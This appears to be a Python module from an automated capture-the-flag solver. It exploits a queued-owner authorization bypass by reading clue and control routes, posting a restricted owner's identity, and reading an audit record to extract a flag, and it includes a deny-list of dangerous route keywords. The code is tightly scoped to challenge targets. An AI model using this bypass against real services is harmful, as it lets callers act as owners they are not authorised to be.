#!/usr/bin/env python3
"""Exact-contract reader for queued-owner binding confusion.

This peer is intentionally not a generic POST form exploiter.  It sends no
mutation until cached target-local clues, an owner directory, and two read-only
controls establish the complete protocol::

    GET owner_directory_route -> caller == current_role, one restricted_owner
    GET feature_route         -> 405 post_required, request_fields == [owner]
    GET secondary_route       -> 400 job_id_required, query_parameter == id

After those bytes agree, the reader reserves the whole terminal group, sends
exactly one compact JSON POST using the directory-derived restricted owner,
requires a correlated 201 receipt, and performs exactly one audit GET with the
receipt's job id.  A proof is eligible only beside the exact final effect
``queue_owner_binding_bypassed``.  The POST is never retried; transport failure,
an incomplete response, 408/425/429, or 5xx is terminal and suppresses readback.

There is no route spray, owner guess, alternate body, redirect, concurrency, or
off-origin request.  Target bytes are parsed as bounded duplicate-key-free JSON
and are never evaluated or executed.
"""

from __future__ import annotations

import datetime as _dt
import json
import os
import re
import sys
import threading
import time
import urllib.parse
from pathlib import Path


# ctf package import (script runs need the checkout root on sys.path)
try:
    from ctf import env as ctf_env, paths as ctf_paths, flagfmt
except ModuleNotFoundError:
    import sys as _sys
    from pathlib import Path as _Path
    _sys.path.append(str(_Path(__file__).resolve().parents[2]))
    from ctf import env as ctf_env, paths as ctf_paths, flagfmt

HERE = Path(__file__).resolve().parent
_TK = HERE.parent / "toolkits"
if str(_TK) not in sys.path:
    sys.path.insert(0, str(_TK))
if str(HERE) not in sys.path:
    sys.path.insert(0, str(HERE))

import web as _web  # noqa: E402 -- sole production transport and scope lock
import post_chain as _shared  # noqa: E402 -- shared proof/carrier policy
import security_json as _security_json  # noqa: E402 -- duplicate-key rejecting JSON


REQUEST_TIMEOUT = 8.0
DEFAULT_SECONDS = 25.0
DEFAULT_MAX_REQUESTS = 5
DEADLINE_PAD = 0.3
READBACK_RESERVE_SECONDS = 1.0
MAX_TEXT = 400_000
MAX_ROUTE_BYTES = 1024
MAX_IDENTITY_BYTES = 128
MAX_JOB_ID_BYTES = 128
MAX_REQUEST_BYTES = 1024

_POST_ERROR = "post_required"
_AUDIT_ERROR = "job_id_required"
_EFFECT = "queue_owner_binding_bypassed"
_IDENTITY = re.compile(r"^[A-Za-z0-9][A-Za-z0-9_.@:-]{0,127}$")
_JOB_ID = re.compile(r"^[A-Za-z0-9][A-Za-z0-9_.-]{0,127}$")
_PROOF_SEEN = flagfmt.PROOF_ANYCASE
_FATAL_ROUTE = re.compile(
    r"(?i)(?:^|[/_.-])(?:delete|destroy|drop|wipe|purge|truncate|erase|revoke|logout|"
    r"signout|disable|deactivate|uninstall|kill|shutdown|restart|reboot|ban|suspend|"
    r"cancel|rollback|restore|transfer|pay|purchase|refund|approve|reject|update|edit|"
    r"password|credential|token|session|account|admin)(?=$|[/_.-]|\d)"
)


def enabled() -> bool:
    raw = ctf_env.get("CTF_WEB_QUEUED_OWNER")
    if raw is not None:
        return raw.strip().lower() not in {"off", "0", "false", "no"}
    try:
        root = ctf_paths.workdir()
        return not (root / "_queued_owner.off").exists()
    except Exception:
        return False


def _snake(value) -> str:
    value = re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", str(value or ""))
    return re.sub(r"[^a-z0-9]+", "_", value.lower()).strip("_")


def _origin(value):
    try:
        parsed = urllib.parse.urlsplit(str(value or ""))
        if (parsed.scheme not in ("http", "https") or not parsed.hostname
                or parsed.username is not None or parsed.password is not None):
            return None
        return (parsed.scheme, parsed.hostname.lower().rstrip("."),
                parsed.port or (443 if parsed.scheme == "https" else 80))
    except Exception:
        return None


def _response(raw):
    if not isinstance(raw, dict):
        return None
    if "body" in raw:
        return raw
    if "text" in raw:
        out = dict(raw)
        out["body"] = str(raw.get("text") or "").encode("utf-8", "replace")
        return out
    return None


def _status(response):
    value = response.get("status") if isinstance(response, dict) else None
    return value if isinstance(value, int) and not isinstance(value, bool) else None


def _header_pairs(response):
    if not isinstance(response, dict):
        return None
    pairs = response.get("response_header_pairs")
    if isinstance(pairs, (list, tuple)):
        if any(not isinstance(row, (list, tuple)) or len(row) != 2 for row in pairs):
            return None
        return [(str(row[0]), str(row[1])) for row in pairs]
    headers = response.get("response_headers", response.get("headers", {}))
    if not isinstance(headers, dict):
        return None
    return [(str(key), str(value)) for key, value in headers.items()]


def _json(response):
    pairs = _header_pairs(response)
    if pairs is None or bool(response.get("truncated")):
        return None
    try:
        _web._validate_stream_framing(_status(response), pairs)
    except Exception:
        return None
    ctypes = [value.split(";", 1)[0].strip().lower() for key, value in pairs
              if key.strip().lower() == "content-type"]
    if len(set(ctypes)) != 1 or not ctypes or not (
            ctypes[0] == "application/json" or ctypes[0].endswith("+json")):
        return None
    body = response.get("body", response.get("text", ""))
    try:
        raw = bytes(body) if isinstance(body, (bytes, bytearray)) else str(body or "").encode()
        if len(raw) > MAX_TEXT:
            return None
        text = raw.decode("utf-8", "strict")
        value = _security_json.loads(text, max_chars=MAX_TEXT)
    except Exception:
        return None
    return value if isinstance(value, (dict, list)) else None


def _safe_route(value, base_url):
    try:
        route = _web.safe_same_origin_route(
            value, base_url, allow_query=False, guard_query=True, max_bytes=MAX_ROUTE_BYTES)
        if route is None:
            return None
        layers = _web.canonical_route_layers(route, max_bytes=MAX_ROUTE_BYTES) or ()
        if not layers or any(_FATAL_ROUTE.search(layer) for layer in layers):
            return None
        return route
    except Exception:
        return None


def _identity(value):
    if not isinstance(value, str) or not _IDENTITY.fullmatch(value):
        return None
    try:
        if len(value.encode("utf-8", "strict")) > MAX_IDENTITY_BYTES:
            return None
    except UnicodeError:
        return None
    return value


def _job_id(value):
    if isinstance(value, bool) or not isinstance(value, (str, int)):
        return None
    rendered = str(value)
    if not _JOB_ID.fullmatch(rendered):
        return None
    try:
        if len(rendered.encode("utf-8", "strict")) > MAX_JOB_ID_BYTES:
            return None
    except UnicodeError:
        return None
    return rendered


def _normalized_fields(document):
    if not isinstance(document, dict):
        return None
    out = {}
    for raw_key, value in document.items():
        key = _snake(raw_key)
        if not key or key in out:
            return None
        out[key] = value
    return out


def _cached_response(preloaded, route, base_url):
    matches = []
    for raw_path, raw_response in list((preloaded or {}).items())[:80]:
        try:
            identity = _web.safe_preloaded_route_key(
                raw_path, base_url, max_bytes=MAX_ROUTE_BYTES)
        except Exception:
            identity = None
        if identity == route:
            matches.append(_response(raw_response))
    if not matches:
        return False, None
    if len(matches) != 1 or matches[0] is None:
        return True, None
    return True, matches[0]


def _cached_clues(preloaded, base_url):
    present, response = _cached_response(preloaded, "/api/clues", base_url)
    doc = _json(response)
    if not present or _status(response) not in range(200, 300) or not isinstance(doc, dict):
        return None, None
    return response, doc


def _contract(clues, base_url):
    fields = _normalized_fields(clues)
    if fields is None:
        return None
    current = _identity(fields.get("current_role"))
    feature = _safe_route(fields.get("feature_route"), base_url)
    directory = _safe_route(fields.get("owner_directory_route"), base_url)
    secondary = _safe_route(fields.get("secondary_route"), base_url)
    routes = (feature, directory, secondary)
    if (current is None or any(route is None for route in routes)
            or len(set(routes)) != len(routes) or "/api/clues" in routes):
        return None
    return {"current": current, "feature": feature,
            "directory": directory, "secondary": secondary}


def _restricted_owner(document, current):
    fields = _normalized_fields(document)
    if fields is None:
        return None
    caller = _identity(fields.get("caller"))
    owner = _identity(fields.get("restricted_owner"))
    if caller != current or owner is None or owner == caller:
        return None
    return owner


def _clean_control(response) -> bool:
    return not _shared.PAYOFF_LIKE.search(_shared._baseline_text(response))


def _feature_control(response):
    doc = _json(response)
    fields = _normalized_fields(doc)
    if (_status(response) != 405 or fields is None or not _clean_control(response)
            or _snake(fields.get("error")) != _POST_ERROR):
        return None
    request_fields = fields.get("request_fields")
    if (not isinstance(request_fields, list) or len(request_fields) != 1
            or _snake(request_fields[0]) != "owner" or request_fields[0] != "owner"):
        return None
    return request_fields[0]


def _audit_control(response):
    doc = _json(response)
    fields = _normalized_fields(doc)
    if (_status(response) != 400 or fields is None or not _clean_control(response)
            or _snake(fields.get("error")) != _AUDIT_ERROR):
        return None
    parameter = fields.get("query_parameter")
    return parameter if isinstance(parameter, str) and parameter == "id" else None


def _with_query(route, parameter, value):
    if not route or "?" in route:
        return None
    path = route + "?" + urllib.parse.urlencode([(parameter, value)])
    return path if len(path.encode("utf-8", "strict")) <= 8192 else None


class _Runner:
    def __init__(self, target, ctx):
        self.target = dict(target) if isinstance(target, dict) else {"url": str(target)}
        self.url = str(self.target.get("url") or "")
        self.ctx = dict(ctx or {})
        try:
            self.deadline = (float(self.ctx["deadline"]) if self.ctx.get("deadline") is not None
                             else time.time() + DEFAULT_SECONDS)
        except (TypeError, ValueError):
            self.deadline = time.time() + DEFAULT_SECONDS
        try:
            self.max_requests = max(0, int(self.ctx.get("max_requests", DEFAULT_MAX_REQUESTS)))
        except (TypeError, ValueError):
            self.max_requests = DEFAULT_MAX_REQUESTS
        self.external_stop = self.ctx.get("stop")
        self.preloaded = dict(self.ctx.get("preloaded") or {})
        supplied = list(self.ctx.get("baseline_texts") or [])
        self.baselines = [str(value or "")[:MAX_TEXT] for value in supplied[:80]]
        if len(supplied) > 80 and _shared.BASELINE_INCOMPLETE not in self.baselines:
            self.baselines.append(_shared.BASELINE_INCOMPLETE)
        for raw in list(self.preloaded.values())[:80]:
            response = _response(raw)
            if response is not None:
                value = _shared._baseline_text(response)
                if value not in self.baselines:
                    self.baselines.append(value)
        self.requests = 0
        self.posts = 0
        self.responses = []
        self.candidates = []
        self.success = False
        self.uuid4 = False
        self.where = None
        self.stopped = None
        self.terminal = False
        self.mutation_started = False
        self.ambiguous_mutation = False
        self.t0 = time.time()
        self.client = None
        self._gate = threading.Lock()
        self._stopped = False
        self._reserved = 0

    def _may_send(self):
        reserved_readback = (self.mutation_started and self._reserved > 0
                             and not self.ambiguous_mutation)
        if self._stopped or (self.terminal and not reserved_readback):
            return False
        if hasattr(self.external_stop, "is_set") and self.external_stop.is_set():
            self.stopped = self.stopped or "stopped"
            return False
        if self.requests >= self.max_requests:
            self.stopped = self.stopped or "max_requests"
            return False
        if self.deadline is not None and self.deadline - time.time() <= DEADLINE_PAD:
            self.stopped = self.stopped or "deadline"
            return False
        return True

    def _client(self):
        if self.client is not None:
            return self.client
        wanted = _origin(self.url)
        if wanted is None:
            self.stopped = "invalid target origin"
            return None
        try:
            candidate = self.ctx.get("client")
            if candidate is None and callable(self.ctx.get("client_factory")):
                candidate = self.ctx["client_factory"](self.url, REQUEST_TIMEOUT)
            if candidate is None:
                candidate = _web.WebClient(self.url, timeout=REQUEST_TIMEOUT)
            if _origin(getattr(candidate, "base", None)) != wanted:
                self.stopped = "client scope mismatch"
                return None
            self.client = candidate
            return candidate
        except Exception as exc:
            self.stopped = f"no scoped client: {type(exc).__name__}"
            return None

    def stop_now(self):
        with self._gate:
            self._stopped = True

    def _allow_route(self, route, method):
        allowed = self.ctx.get("route_allowed")
        if not callable(allowed):
            return True
        try:
            return bool(allowed(route, method=method))
        except TypeError:
            try:
                return bool(allowed(route))
            except Exception:
                return False
        except Exception:
            return False

    def _reserve_mutation_group(self):
        with self._gate:
            if (self._client() is None or not self._may_send()
                    or self.requests + 2 > self.max_requests
                    or self.deadline - time.time() <= READBACK_RESERVE_SECONDS + DEADLINE_PAD):
                self.stopped = self.stopped or "cannot reserve complete mutation/readback group"
                return False
            self._reserved = 2
            return True

    def _send(self, method, path, role, *, data=None, headers=None, reserve_after=0.0):
        allow_query = method == "GET" and role == "correlated-audit-readback"
        try:
            route = _web.safe_same_origin_route(
                path, self.url, allow_query=allow_query, guard_query=True, max_bytes=8192)
        except Exception:
            route = None
        if route is None:
            self.stopped = self.stopped or "unsafe queued-owner request"
            return None
        with self._gate:
            client = self._client()
            if client is None or not self._may_send():
                return None
            if self.mutation_started and method != "POST" and self._reserved <= 0:
                self.stopped = "readback was not reserved before mutation"
                self.terminal = True
                return None
            encoded = data.encode("utf-8") if isinstance(data, str) else bytes(data or b"")
            if len(encoded) > MAX_REQUEST_BYTES:
                self.stopped = "request body too large"
                return None
            try:
                left = self.deadline - time.time() if self.deadline is not None else None
                client.timeout = REQUEST_TIMEOUT if left is None else max(
                    0.2, min(REQUEST_TIMEOUT, left - DEADLINE_PAD - max(0.0, reserve_after)))
            except Exception:
                pass
            self.requests += 1
            self.posts += int(method == "POST")
            if self._reserved:
                self._reserved -= 1
            if method == "POST":
                self.mutation_started = True
                self.terminal = True
            try:
                response = client.request(
                    method, route, data=data, headers=dict(headers or {}), allow_redirects=False)
            except Exception as exc:
                self.responses.append({"role": role, "method": method, "path": route.split("?", 1)[0],
                                       "status": None, "error": type(exc).__name__})
                if method == "POST":
                    self.ambiguous_mutation = True
                    self.stopped = "ambiguous_mutation"
                else:
                    self.stopped = self.stopped or f"transport: {type(exc).__name__}"
                self.terminal = True
                return None
            response = _response(response)
            status = _status(response)
            self.responses.append({"role": role, "method": method, "path": route.split("?", 1)[0],
                                   "status": status})
            incomplete = (response is None or bool(response.get("truncated"))
                          or _json(response) is None)
            if method == "POST" and (incomplete or status in (408, 425, 429)
                                      or status is None or status >= 500):
                self.ambiguous_mutation = True
                self.stopped = "ambiguous_mutation"
                return None
            if incomplete:
                self.stopped = self.stopped or "incomplete response"
                if self.mutation_started:
                    self.terminal = True
                return None
            return response

    def _control(self, route, role):
        present, response = _cached_response(self.preloaded, route, self.url)
        if present:
            if response is None:
                self.stopped = f"ambiguous cached {role}"
            return response
        return self._send("GET", route, role)

    def run(self):
        if not enabled():
            self.stopped = "off"
            return None
        _clue_response, clues = _cached_clues(self.preloaded, self.url)
        contract = _contract(clues, self.url)
        if contract is None:
            self.stopped = "no exact cached queued-owner contract"
            return None
        if not (self._allow_route(contract["directory"], "GET")
                and self._allow_route(contract["feature"], "GET")
                and self._allow_route(contract["feature"], "POST")
                and self._allow_route(contract["secondary"], "GET")):
            self.stopped = "caller route policy refused queued-owner route"
            return None

        missing = sum(not _cached_response(self.preloaded, contract[key], self.url)[0]
                      for key in ("directory", "feature", "secondary"))
        if self.max_requests - self.requests < missing + 2 or not self._may_send():
            self.stopped = self.stopped or "insufficient budget for queued-owner sequence"
            return None
        if self._client() is None:
            return None

        directory = self._control(contract["directory"], "owner-directory-control")
        directory_doc = _json(directory)
        owner = (_restricted_owner(directory_doc, contract["current"])
                 if _status(directory) in range(200, 300) else None)
        if owner is None or not _clean_control(directory):
            self.stopped = self.stopped or "owner directory did not establish one restricted owner"
            return None
        self.baselines.append(_shared._baseline_text(directory))

        feature = self._control(contract["feature"], "post-shape-control")
        owner_field = _feature_control(feature)
        self.baselines.append(_shared._baseline_text(feature))
        if owner_field is None:
            self.stopped = self.stopped or "feature control did not authorize one owner-only POST"
            return None

        audit = self._control(contract["secondary"], "audit-query-control")
        query_parameter = _audit_control(audit)
        self.baselines.append(_shared._baseline_text(audit))
        if query_parameter is None:
            self.stopped = self.stopped or "audit control did not establish one job-id query"
            return None

        if not self._reserve_mutation_group():
            return None
        payload = json.dumps({owner_field: owner}, separators=(",", ":"), ensure_ascii=False)
        receipt = self._send(
            "POST", contract["feature"], "restricted-owner-action",
            data=payload, headers={"Content-Type": "application/json"},
            reserve_after=READBACK_RESERVE_SECONDS,
        )
        receipt_doc = _json(receipt)
        receipt_fields = _normalized_fields(receipt_doc)
        job_id = _job_id(receipt_fields.get(query_parameter)) if receipt_fields is not None else None
        if (_status(receipt) != 201 or receipt_fields is None
                or receipt_fields.get("ok") is not True or job_id is None
                or receipt_fields.get("queued_owner") != owner
                or _shared._error(receipt_doc)):
            self.stopped = self.stopped or "uncorrelated queued-owner receipt"
            return None
        self.baselines.append(_shared._baseline_text(receipt))

        readback_path = _with_query(contract["secondary"], query_parameter, job_id)
        if readback_path is None:
            self.stopped = "receipt job id did not fit the audit route"
            return None
        payoff = self._send("GET", readback_path, "correlated-audit-readback")
        doc = _json(payoff)
        fields = _normalized_fields(doc)
        if (_status(payoff) not in range(200, 300) or fields is None
                or fields.get("ok") is not True or _shared._error(doc)
                or _snake(fields.get("effect")) != _EFFECT):
            self.stopped = self.stopped or "correlated audit lacked the exact binding-bypass effect"
            return None

        anchor, siblings = _shared._coherent_json_view(payoff, doc)
        if anchor is None:
            self.stopped = "binding-bypass effect did not occupy one coherent JSON carrier"
            return None
        sibling_candidates = _shared._carrier_candidates(siblings)
        if sibling_candidates:
            self.success = True
            self.where = "queued_owner:correlated-audit"
            self.candidates = sibling_candidates[:12]
            self.stopped = "audit anchor and proof/candidate occupied different carrier views"
            return None
        synthetic = dict(payoff)
        synthetic["body"] = anchor.encode("utf-8", "replace")
        synthetic["response_headers"] = {"Content-Type": "application/json"}
        synthetic.pop("response_header_pairs", None)
        synthetic.pop("headers", None)
        info = _shared.extract_anchored(
            synthetic, self.baselines, anchored=True,
            host=urllib.parse.urlsplit(self.url).hostname,
        )
        self.success = True
        self.where = "queued_owner:correlated-audit"
        self.uuid4 = bool(info.get("uuid4"))
        self.candidates = list(info.get("candidates") or [])[:12]
        if info.get("auto") is None:
            self.stopped = "binding-bypass effect carried no single novel strict proof"
        return info.get("auto")

    def summary(self, proof):
        incomplete = (_shared._proof_policy is not None
                      and hasattr(_shared._proof_policy, "baseline_set_incomplete")
                      and _shared._proof_policy.baseline_set_incomplete(self.baselines))
        return {"proof": proof, "class": "queued_owner_binding", "success": self.success,
                "terminal": self.terminal, "mutation_started": self.mutation_started,
                "ambiguous_mutation": self.ambiguous_mutation,
                "candidates": list(dict.fromkeys(self.candidates))[:12], "uuid4": self.uuid4,
                "baseline_proofs": list(dict.fromkeys(
                    match.group(0) for text in self.baselines
                    for match in _PROOF_SEEN.finditer(str(text or ""))))[:24],
                "baseline_incomplete": bool(incomplete), "requests": self.requests,
                "posts": self.posts, "seconds": round(time.time() - self.t0, 3),
                "where": self.where, "stopped": self.stopped,
                "responses": self.responses[:12]}


def _surface(runner, ctx):
    evidence = ctx.get("evidence") if isinstance(ctx, dict) else None
    if not isinstance(evidence, list):
        return
    aid = runner.target.get("answer_id") or "target"
    for value in list(dict.fromkeys(runner.candidates))[:6]:
        line = _web.safe_display_text(
            f"WEB QUEUED-OWNER CANDIDATE {aid}: {value} "
            "(correlated audit response; not auto-submitted)", 600)
        if line not in evidence:
            evidence.append(line)


def solve(target, ctx=None):
    """Solve one target; never raises, retries or submits."""
    ctx = dict(ctx or {})
    runner = _Runner(target, ctx)
    proof = None
    try:
        proof = runner.run()
    except Exception as exc:
        runner.stopped = runner.stopped or f"error: {type(exc).__name__}"
        if runner.mutation_started:
            runner.ambiguous_mutation = True
            runner.terminal = True
    finally:
        runner.stop_now()
    _surface(runner, ctx)
    summary = runner.summary(proof)
    aid = runner.target.get("answer_id") or "target"
    sink = ctx.get("result_sink")
    if isinstance(sink, dict):
        sink[aid] = summary
    _write_log(ctx.get("log_dir"), ctx.get("challenge"), aid, summary)
    return proof


def solve_targets(targets, ctx=None):
    out = {}
    for index, target in enumerate(list(targets or [])):
        if not isinstance(target, dict):
            continue
        item = dict(target)
        aid = str(item.get("answer_id") or item.get("id") or f"target-{index + 1}")
        item["answer_id"] = aid
        out[aid] = solve(item, ctx)
    return out


def _write_log(log_dir, challenge, aid, summary):
    if not log_dir:
        return
    try:
        folder = Path(log_dir)
        folder.mkdir(parents=True, exist_ok=True)
        row = {"at": _dt.datetime.now().astimezone().isoformat(timespec="seconds"),
               "challenge": challenge, "answer_id": aid, **summary}
        with (folder / "queued_owner.jsonl").open("a", encoding="utf-8") as handle:
            handle.write(json.dumps(row, separators=(",", ":"), default=str) + "\n")
    except Exception:
        pass
